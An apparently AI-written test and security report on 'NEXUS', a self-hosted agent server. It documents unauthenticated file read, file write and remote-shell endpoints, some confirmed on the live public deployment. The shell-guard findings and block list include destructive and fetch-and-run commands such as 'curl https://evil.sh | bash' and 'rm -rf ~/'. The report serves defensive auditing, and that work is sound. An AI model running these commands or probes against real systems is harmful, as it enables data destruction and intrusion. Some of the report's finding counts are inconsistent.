# NEXUS — test report

**Repository:** `unknowncanwrite/agent` @ `a8fc6b9` ("Add files via upload") — the commit the
public deployment `https://agent-3tll.onrender.com` is serving.
**Suite:** `tests/` (see `tests/README.md`), developed on branch `arena/01a0a92f-agent`.
**Run:** `cd /home/user/agent && node tests/run.mjs`
**Result:** **183 passed, 0 failed, 6 findings** (87 s, no network required).

| suite | passed | failed | findings |
|---|---:|---:|---:|
| 01 static | 14 | 0 | 0 |
| 02 units | 67 | 0 | 0 |
| 03 models | 32 | 0 | 0 |
| 04 server (end-to-end) | 35 | 0 | 0 |
| 05 security | 17 | 0 | 7 |
| 06 publish | 18 | 0 | 0 |

**Updated after the second pass.** Nine findings were fixed (the tests that proved them now
report `✓ (fixed)` and keep guarding the behaviour), and the new auto-publish feature was
added with its own suite. The **only** findings left are the security model itself, which the
owner has explicitly decided to keep open (personal machine, personal link):

| # | severity | finding | status |
|---|---|---|---|
| 1 | critical | unauthenticated arbitrary file read (`AGENT_FULL_ACCESS=true`) | open by decision |
| 2 | critical | unauthenticated arbitrary file write | open by decision |
| 3 | critical | unauthenticated remote shell (`POST /api/term`) | open by decision |
| 4 | high | no authentication on any endpoint | open by decision |
| 9 | medium | `hooks.json` is remotely writable and executed | open by decision |
| 14 | low | API key preview published on `/api/health` + `/api/logs` | open by decision |

Everything below is kept for the record: it is the state the first pass found, with the
fix status noted per item.

Findings are defects the suite *proves* and reports with a severity instead of failing the
run (`expectDefect`), so the same suite is green before and after each fix — a fixed
defect shows up as `✓ (fixed)`.

---

## 1. What the agent is (short version)

* **Boot.** `start.js` is a supervisor: preflight, spawn `server.js`, restart on
  `RESTART_CODE 42`, give up after 3 crashes. `server.js` is an Express + SSE app; the UI
  in `public/` is a single page that reattaches to background jobs over SSE.
* **The loop.** `agent.js` (~1.5k lines) is the substance: ~90 tools declared by `T(...)`,
  implemented in `makeImpl(ctx)`, and an autonomous loop with
  step budgeting, read-only tool batching (parallel), a "nothing was produced" guard, a
  "described the work instead of doing it" retry, a *completion gate* that refuses to
  finish a build that was never run, project memory written to `NEXUS.md`, and a learn pass.
* **Supervision.** `supervisor.js` is a second, independent agent: cheap deterministic
  detectors (loop / oscillation / repeat-failure / error-streak / thrash / unverified /
  stalled / no-output) plus an LLM critic that picks a *different* model from the worker.
* **Models.** `providers.js` registers cloud providers (xkiro via env, plus any user
  providers in `providers.json`, plus auto-detected local servers) and `models.js` ranks
  them free-first (`local < free < premium < paid`, hand-tuned quality scores, bonuses for
  the reliable mains), selects by role (`fast/plan/review/vision/code`), builds failover
  chains, retries 400s that complain about a parameter, and streams with a first-token
  stall guard. Quota/balance errors are classified and "benched" so later calls skip them.
* **Durability.** `jobs.js` makes every `/api/smart` run a detached job per `chatId` with a
  sequenced event buffer, so reloads/tab switches reattach (`/api/jobs/:id/stream?since=`)
  and disconnects do not kill work.
* **Extensibility.** `hooks.js` runs shell commands around tool events and keeps file
  checkpoints; `skills/` are markdown methodologies the agent can load; `mcp.js` attaches
  external MCP servers; `selfedit.js` lets it patch its own source.
* **Safety model.** One switch: `agent.js:resolvePath()` jails every path to
  `AGENT_WORKSPACE` unless `AGENT_FULL_ACCESS=true`; `shell.js` has a regex block list (since
  this pass, a verb × protected-target set rather than six one-liner patterns); there is **no
  authentication anywhere** — a deliberate choice for a personal machine (see §3).

## 2. How it was tested

* The real `server.js` is booted in a sandbox copy of the repo (temp dir, temp
  `AGENT_WORKSPACE`, symlinked `node_modules`) against a scripted OpenAI-compatible mock
  (`tests/mock-upstream.mjs`) that can emit tool calls, bad parameters, 500s, 429 quota
  errors, stalls and prose.
* Everything is exercised through the real HTTP/SSE surface, plus direct unit tests of the
  pure modules (shell, memory, router, supervisor, hooks, skills, mcp, jobs, tool impls).
* Fault scenarios in the model layer run on isolated providers + fresh module instances,
  because `models.js` benches dead models/providers in process-global maps that never reset.
* No product code was modified. Every finding below includes a suggested patch; say the
  word and I will apply them.

## 3. Findings

Legend: **open by decision** = the owner keeps the open/full-access design on purpose;
**fixed** = patch applied in this branch.

| # | severity | finding | suite | status |
|---|---|---|---|---|
| 1 | **critical** | unauthenticated arbitrary file read (`AGENT_FULL_ACCESS=true`) | 05 | open by decision |
| 2 | **critical** | unauthenticated arbitrary file write | 05 | open by decision |
| 3 | **critical** | unauthenticated remote shell (`POST /api/term`) | 05 | open by decision |
| 4 | **high** | no authentication on any endpoint | 05 | open by decision |
| 5 | high | no `.gitignore` — `.env`/state can be committed | 01 | **fixed** |
| 6 | medium | `complete()` never benches an out-of-quota provider | 03 | **fixed** |
| 7 | medium | uncaught `ERR_STREAM_WRITE_AFTER_END` from an SSE endpoint | 04 | **fixed** |
| 8 | medium | shell guard misses destructive commands | 05 | **fixed** |
| 9 | medium | `hooks.json` is remotely writable and executed | 05 | open by decision |
| 10 | medium | `.env.example` missing though the UI/docs tell you to copy it | 01 | **fixed** |
| 11 | low | `START-MAC-LINUX.sh` documented as runnable, committed as `100644` | 01 | **fixed** |
| 12 | low | unknown provider prefix silently re-routed | 03 | **fixed** (warns now) |
| 13 | low | `POST /api/ws/reset` leaves stale caches | 04 | **fixed** |
| 14 | low | API key preview exposed to anonymous clients | 05 | open by decision |
| 15 | low | destructive commands outside the guard list run in full-access mode | 05 | **fixed** |

### What the fixes were (11 items, 6 files)

* **4 → kept open on purpose.** *The owner uses this on a personal machine behind a personal
  link and asked for the open design to stay: no auth middleware, `HOST=0.0.0.0`,
  `AGENT_FULL_ACCESS=true`, key preview and all.* Nothing about the access model was changed.
* **5 `.gitignore`** — added (`.env`, `.memory/`, `workspace/`, `uploads/`, `providers.json`,
  `.providers-off.json`, `node_modules/`, caches).
* **10 `.env.example`** — added, documenting the model keys, server settings, access switches
  and every hosting variable.
* **11 launcher mode** — `START-MAC-LINUX.sh` is now committed as `100755`.
* **6 quota bench** (`models.js`) — `complete()` now calls `markProviderDead(model)` on a quota
  error, matching `streamWithFailover()`: once a free tier is exhausted the model picker stops
  ranking that provider's models instead of re-discovering the 429 on every call.
* **7 SSE write-after-end** (`jobs.js`) — `attach()` no longer sends a synthetic `job_end` when
  the replay already ended with one. Reconnecting to a finished task no longer triggers an
  uncaught `ERR_STREAM_WRITE_AFTER_END` that only the global handler survived.
* **13 stale caches** (`server.js`) — `POST /api/ws/reset` now calls `invalidateCache()`, so
  `/api/ws/tree` and `read_file` stop listing/serving files that were just deleted.
* **12 provider prefixes** (`providers.js`) — `resolve()` logs a one-off warning naming the
  unknown prefix, the id, and the known providers (it used to re-route in complete silence).
  It still routes rather than throwing, because valid ids such as `qwen/…:free` also carry a
  slash, and throwing would break the documented fallback chain.
* **8 + 15 shell guard** (`shell.js`) — the block list was rewritten from six patterns to a
  set of *verb × protected-target* rules. Now refused: `rm -rf ~/`, `rm -rf /`, `rm -rf /etc/…`,
  `rm -f /etc/passwd`, `shutil.rmtree(...)`, `find / … -delete`, `find /etc … -exec rm`,
  `curl … | bash`, `mv`/`cp`/`ln`/`rsync` from `/etc|/usr|/bin|/boot|/var|/opt|/root|…`,
  `truncate`/`shred`/`chattr` on those trees, `chmod -R` / `chown -R` on them, redirects into
  them, and `sudo rm -rf $HOME`. The tests pin the *allowed* side too — `rm -rf ./build`,
  `rm -rf ~/Downloads/junk`, `cp -r dist ~/Desktop/site`, `mv app.js app.bak`,
  `find . -name '*.log' -delete`, `rsync -a dist/ /tmp/site/`, `curl … | head` — so ordinary
  work on the user's own machine never gets blocked.

### 1–3 · The public deployment is an open remote shell (critical)

With `AGENT_FULL_ACCESS=true` — which `/api/system` reports as `true` on
`agent-3tll.onrender.com` — an anonymous caller with the URL can:

| probe | result |
|---|---|
| `GET /api/download?path=/etc/passwd` | `200` + full file contents |
| `GET /api/download?path=<app>/.env` | `200` + the live `XKIRO_API_KEY` and every other secret |
| `POST /api/ws/file {"path":"/anything"}` | writes wherever the process can write |
| `POST /api/term {"command":"id"}` | `uid=1001(user) gid=1001(user) groups=1001(user),27(sudo),100(users)` |

Evidence from the suite's sandboxed full-access server: read leaked `root:x:0:0` and the
canary `.env`; write created `<workspace>/../nexus-outside-write-probe.txt` *and*
`/tmp/nexus-abs-write-probe.txt`; shell returned `uid=1001(user) … Linux`.

Why it matters: this is not just data exposure. `POST /api/ws/file` can overwrite
`server.js`/`agent.js`, drop an `authorized_keys`, or write a cron entry — arbitrary code
execution on the host, reachable by anyone who learns the URL. The workspace on that
deployment already contains a previously generated app, i.e. the agent is being driven
from outside.

**Suggested fix (minimum viable, in priority order):**

1. Give the server a shared secret and require it on *every* route:
   ```js
   const TOKEN = process.env.NEXUS_TOKEN || "";
   app.use((req, res, next) => {
     if (!TOKEN) return next();                       // local dev keeps working
     const got = req.get("x-nexus-token") || req.query.token || "";
     if (got !== TOKEN) return res.status(401).json({ error: "unauthorized" });
     next();
   });
   ```
   and have `public/app.js` send the token from `localStorage` (or the URL once, then store).
2. Default `HOST` to `127.0.0.1` (`server.js:463`), so a plain `npm start` is not on the LAN.
   Render/containers can set `HOST=0.0.0.0` explicitly — but then the token above is mandatory.
3. Do not run the public deployment with `AGENT_FULL_ACCESS=true`. If remote full-PC control
   is the product, put it behind auth *and* keep the workspace jail for HTTP-reachable
   file endpoints (`/api/ws/*`, `/api/download`) regardless of the agent's own access mode.

### 4 · No authentication on any endpoint (high)

12/12 probed endpoints answered an anonymous caller with no key, cookie or header
(`/api/health`, `/api/system`, `/api/models`, `/api/jobs`, `/api/ws/tree`, `/api/memory`,
`/api/hooks`, `/api/providers`, `POST /api/ws/file`, `POST /api/term`, `POST /api/fullaccess`,
`POST /api/hooks`). `POST /api/fullaccess {"enabled":true}` flips the jail off at runtime for
a server started jailed — so even a "safe" deployment becomes finding 1–3 by one request.
Fixed by the same middleware as above; additionally consider making `/api/fullaccess`
require a token even in "local" mode and refusing it when the request is not loopback.

### 5 · No `.gitignore` (high)

`.env`, `.memory/`, `workspace/`, `uploads/`, `providers.json`, `.providers-off.json`,
`node_modules/` and `package-lock.json` (currently modified) are all committable. A single
`git add .` publishes the API key. Fix: add a `.gitignore` with `.env`, `.memory/`,
`workspace/`, `uploads/`, `node_modules/`, `providers.json`, `.providers-off.json`,
`*.log`, `.DS_Store`; and purge the key from history if it was ever committed.

### 6 · `complete()` does not bench an out-of-quota provider (medium)

`models.js:complete()` calls `markDead(model)` on a quota error but never
`markProviderDead()`, while `streamWithFailover()` does. Proven in isolation: after a 429
the model is dead but `providerDead()` is still `false`, so every chain built afterwards
still ranks that provider's models as healthy, walks into the same 429 and only then falls
through — one wasted round-trip per call and an invisible failure for the critic (which uses
`providerDead()` to avoid dead providers).

```js
// models.js — inside complete()'s catch, before the generic hard-error branch
if (isQuota(e)) { markProviderDead(model); lastErr = e; break; }   // NEW
if (!transient(e)) { markDead(model); break; }                     // unchanged
```

### 7 · Uncaught `ERR_STREAM_WRITE_AFTER_END` on SSE reattach (medium)

`GET /api/jobs/:chatId/stream?since=-1` on a **finished** job writes twice after the response
ended: `jobs.js:attach()` replays the buffer (whose last event is `job_end`, which the route
uses to `res.end()`), then, because the job is no longer running, calls the listener again
with a fresh `job_end`. The write-after-end error is emitted asynchronously, so the route's
`try/catch` cannot catch it and it lands on the process-level `uncaughtException` handler —
every reconnect to a just-finished task depends on that global handler to stay alive.
Fix: in `attach()`, skip the synthetic `job_end` when the buffer already contains one, or
track `res.writableEnded` in the route before writing.

### 8 · Shell guard misses destructive commands (medium)

`shell.js` `BLOCKED` is a short regex list; not blocked (and therefore executable):
`rm -rf ~/`, `python3 -c "shutil.rmtree('/home')"`, `find / -name '*.env' -delete`,
`curl https://evil.sh | bash`, `mv /etc/hosts /tmp`, `truncate -s 0 /etc/passwd`.
Proven end-to-end: `truncate -s 0 victim.txt && find . -name 'victim*.txt' -delete` ran with
exit 0 and destroyed the file. Fix: treat the guard as defence-in-depth only (auth is the
real control), and extend it with `rm -rf` on `~`/`$HOME`/`.`/`/`, `shutil.rmtree`,
`find … -delete`, `truncate -s 0` on absolute paths, `| (bash|sh)`, `mv|cp` into `/etc`,
`chmod -R`, `chown -R`, and `> /etc/…`.

### 9 · `hooks.json` is writable and executed (medium)

`POST /api/hooks` needs no auth and writes `hooks.json`, which `hooks.js:fire()` runs through
the shell on the next tool event. The suite installed a hook that ran `id > hook-marker.txt`
and confirmed both the marker and that a failing `before_write` hook also blocks the agent's
next write. This is remote persistence: it survives restarts and runs on every future
write. Fix: auth (see #4), and require an explicit allow-list for hook commands.

### 10–15 · Smaller issues (fix status in the table above)

* **(10) `.env.example` missing.** `models.js` and the README tell the user to copy it; it
  does not exist, so every variable name has to be guessed. Ship one.
* **(11) `START-MAC-LINUX.sh` is mode `100644`** while the README presents it as directly
  runnable — `./START-MAC-LINUX.sh` gives "permission denied". `git update-index --chmod=+x`.
* **(12) Unknown provider prefixes are silently re-routed.** `providers.js:resolve("ghost/some-model")`
  returns `{provider:"xkiro", model:"ghost/some-model"}` instead of failing, so a typo or a
  stale id produces a confusing upstream model error. Throw or warn when the prefix is not
  a registered provider.
* **(13) `POST /api/ws/reset` leaves stale caches.** It deletes the files but never calls
  `invalidateCache()`, so `/api/ws/tree` keeps listing deleted files for ~8 s and
  `/api/ws/file` serves deleted content for ~15 s (the same caches back the agent's own
  `list_files`/`read_file`). One-line fix after the `rm`.
* **(14) API key preview leaked.** `/api/health` returns `keyPreview` (first 8 + last 4
  chars), and the startup banner writes the same preview into the log buffer that
  `/api/logs` replays. Drop the field and mask the banner.
* **(15) `full-access guard`** — same root cause as #8, measured in the armed configuration:
  `mv <workspace>/guard-victim.txt <…>.moved` ran as an anonymous caller.

## 4. What the tests confirm *works*

* **The agent loop is real.** In one run the agent called `write_file` and `run_command`,
  the terminal streamed the script's output to the UI, and the run ended `done` with the file
  on disk — verified end-to-end through `/api/smart` and again through `/api/agent`.
* **Routing**, `title`, chat streaming, `delta`/`reasoning`/`done`/`job_end` event shapes.
* **Read-only batching:** three parallel reads in one step emitted a single `batch` event and
  three `tool_end` events.
* **Failure handling:** an unknown tool is reported to the model as "no tool called" with
  `failed:true` instead of crashing; a model that only *describes* the work gets a critic
  nudge and a model switch; a model that claims to be finished with an unverified build gets
  its completion blocked (`critic kind: gate`); `ask_user` pauses with `done.awaiting:true`;
  a looping model is stopped by `maxSteps`.
* **Jobs:** detached execution, duplicate-run refusal, `/api/jobs` summaries, replay from the
  start, `stop` → `job_end.status="stopped"`, reattach after disconnect.
* **Model layer:** free-first ranking, `local<free<paid`, per-role selection
  (fast/vision/plan), preferred-model-first chains, dedup, dead-model ejection, 400
  parameter retry (proved from the mock's request log: the retry drops `temperature`),
  transient-5xx retry, failover with `onSwitch`, streaming stall guard that abandons a silent
  model after `firstTokenMs`, `parallel()` per-job error isolation, kimi-k3 parameter
  sanitising, quota/balance classification.
* **The default configuration is a real jail.** In the sandboxed server every escape attempt
  was refused: absolute/traversal reads and writes, `../` upload filenames (sanitised to a
  basename inside `uploads/`), and `/api/term` with a `cwd` outside the workspace.
* **Publishing** (new): site detection, build, upload and the URL card are covered in §6b.
* **Units:** `runStream` exit codes/timeouts/live streaming/blocked-command refusal (126),
  memory remember/recall/forget/notes/sessions/stats/context, router heuristics, all eight
  supervisor detectors, hooks firing with `$TOOL`/`$FILE` and blocking on failure,
  checkpoints, skills catalogue, MCP config, job buffering/replay/stop, and every core tool
  impl (`write_file` invalidates the read cache, `edit_file` fuzzy match, `run_command`
  backgrounding refusal, path jail, `update_plan` no-op rejection).

## 5. The live deployment

### 5a. Live end-to-end run (2026-09-16)

Egress from the development sandbox is allow-listed to GitHub, so the live test is driven by
`.github/workflows/live-probe.yml` from a GitHub runner (open internet) against the real
deployment — no mocks, no local copy:

| run | task | result | model | tools | events |
|---|---|---|---|---|---|
| 1 | write `live-test.txt` (`date -u` + hostname), run `cat` | `done` | dashscope/qwen3.8-flash | 1 (`run_command`) | 52 |
| 2 | same | `done` | dashscope/qwen3.8-flash | 1 | 26 |
| 3 | same | `done` | dashscope/qwen3.8-max-0902 | 1 | 38 |
| 4 | same | `done` | dashscope/qwen3.8-flash | 1 | 31 |
| 5 | same | `done` | dashscope/qwen3.8-max-0902 | 1 | 38 |

Verified from the deployment itself afterwards:

* `/api/jobs` lists the runs: `{"chatId":"live-probe-4","status":"done","tools":1,"step":2,
  "lastTool":"run_command","model":"dashscope/qwen3.8-flash"}` — the detached-job manager,
  per-job model tracking and tool counters all work in production.
* `/api/ws/file?path=live-test.txt` → `{"content":"Wed Sep 16 15:28:17 UTC 2026\nsrv-dal3tkn40ujc739f48kg-hibernate-84b9cb475f-vb5lf\n"}` —
  the file was really created and executed **on the Render instance** (the hostname is the
  container id), and the workspace API returns it byte-exact.
* `/api/health` → `{"server":"ok","key":true,"upstream":true,"models":175,"free":167}`.
* `/api/publish` → `Cannot GET /api/publish`: the deployment still runs the `main` build, so
  the publish feature is **not** there yet (see `docs/CONNECT-HOSTING.md` for how to deploy it).
* The probe reports `publish backends ready: none` — no host credential is configured on the
  deployment yet, which is exactly what the new Hosting chip shows in the UI.

Operational note: the free Render instance hibernates. The first request of the day returned
Render's "Application loading" page and the service needed ~60 s to come up (the workflow
retries with backoff, so it still passed). After that it answered in milliseconds.

### 5b. Endpoint probes (from the platform fetcher)

* `/api/health` → ok, key present, upstream reachable, **175 models (167 free)** via
  `https://api.xkiro.com/v1`, and it publishes `keyPreview` (first 8 + last 4 chars of the
  live key) to the anonymous caller — finding 14 is live too.
* `/api/system` → **`fullAccess: true`** on a public host (user `render`, app dir
  `/opt/render/project/src`, Chromium present in the Playwright cache).
* `/api/download?path=/etc/passwd` → **the whole file was returned** (re-verified while
  writing this report).
* `/api/ws/tree?dir=.` → a previously generated `todo-app/` + `todo.md` in the workspace.
* `/api/os/status` → `pyautogui` not installed there (desktop tools unavailable);
  `/api/android/status` → no JDK/SDK; `/api/gemini/status` → up.

So findings 1–4 and 8–9 apply to the running deployment exactly as written; the suite
reproduces them in a sandbox because the suite cannot reach the host from here
(`NEXUS_LIVE=<url> node tests/run.mjs 05` adds the probe when egress is available).

## 6. Limitations / not covered

* **Browser/desktop tools were not executed.** No Chromium in this environment, so
  `screenshot`, `browser_interact`, `cursor_*`, `screen_capture` and JARVIS/OS automation are
  untested beyond argument validation and the `os/install` path. The UI itself is only checked
  as static assets — no DOM/behaviour tests.
* **Android SDK, MCP servers, real providers.** `android_*` was not run (no JDK/SDK), no MCP
  server was attached, and all model traffic went to the mock — no real provider was called
  from the suite (the live checks above cover availability only).
* **Load/robustness.** No concurrency stress (many simultaneous jobs), no long-run soak, no
  fuzzing of the multipart parser or of tool arguments.
* **Subagents/swarms** (`spawn_subagents`, `swarm.js`, `workers.js`) are covered only through
  unit/tool-shape checks; a full parallel-swarm run is not part of the suite.
* Findings are *proved* but individual severities are judgement calls; the security block
  (1–4, 8, 9) matters far more than the convenience issues (10–15).

## 6b. Auto-publish (new feature, suite 06)

Requested: *"whenever it makes a website it should auto publish on render or vercel, whatever
possible"*. Implemented as `publish.js` + a `publish_website` tool + an automatic step at the
end of any run that produced a site.

**Pipeline** — `detectSite()` finds the site (an `index.html`, or a `package.json` with a
`build` script), `buildSite()` runs `npm install` when the project has dependencies and
`npm run build`, `collect()` packs the output (skips `node_modules`, source maps, dot-files,
anything >5 MB, caps at 800 files; binaries are base64-encoded), then the first configured
backend deploys it.

**Backends** (first ready one wins; `publish_website({backend})` can force one):

| backend | credentials | how |
|---|---|---|
| Vercel | `VERCEL_TOKEN` | `POST /v13/deployments` with the files inline → `https://<name>.vercel.app` |
| Render | `RENDER_DEPLOY_HOOK_URL`, or `RENDER_API_KEY`+`RENDER_SERVICE_ID` | triggers the deploy hook / `POST /v1/services/:id/deploys` |
| GitHub Pages | `PUBLISH_GITHUB_REPO=owner/repo` | contents API through an authenticated `gh`, then enables Pages |

**When it runs** — a run may only publish a site it *created itself*: `siteFromWritten()`
intersects the run's written files with candidate site roots, so re-running an unrelated task
never re-deploys an old project. Publishes are streamed to the UI as `publish_start` /
`publish_log` / `publish` events (live and on reattach) and end with a clickable URL card; the
loop also injects `[PUBLISHER] …` into the conversation so the final answer links the URL.
Nothing configured → the run serves the site on `localhost`, says which variable to set, and
the Hosting sheet (new chip in the header, backed by `GET /api/publish`) shows what is ready.
`NEXUS_AUTO_PUBLISH=false` switches off the automatic step; `NEXUS_FORCE_BUILD=true` forces a
rebuild even when a previous build output exists.

**Suite 06** proves all of it offline against the mock's fake hosting APIs (18 tests):
detection of static and node sites, project-name sanitising, the fresh-files-only rule, a real
`npm run build`, a broken build being reported instead of deploying stale output, the exact
Vercel request body (files, encodings, `target: production`), Render hook vs API, the
`gh`-missing path, and the tool's fallbacks. Suite 04 additionally runs the whole loop end to
end and asserts a deployment actually reaches the (mock) Vercel API.

**To switch it on for the deployment:** set `VERCEL_TOKEN` (easiest — create a token, no CLI
needed) or `RENDER_DEPLOY_HOOK_URL` in the Render service's environment variables. Nothing else
in the app needs to change.

## 7. Remaining work

Items 5–13 and 15 are done (see §3). What is left is a decision, not a bug list:

1. **Items 1–4, 9, 14 stay open by the owner's explicit choice** — this runs on a personal
   machine behind a personal link, and the open design is wanted. If the URL is ever shared or
   the host changes, run `NEXUS_LIVE=<url> node tests/run.mjs 05` and treat findings 1–4 as
   blocking.
2. **Rotate the key if the repo is ever pushed with the working `.env`** — the new
   `.gitignore` prevents it from here on, but history is history.
3. **Add a token only if the deployment goes public** — the middleware sketched in §1 is ~6
   lines in `server.js` and the suite's `OPEN_ENDPOINTS` probe verifies it in one run.
4. Optional polish: the guard is a seatbelt, not a sandbox — anything it does not model still
   runs, which is the point on a machine you own.
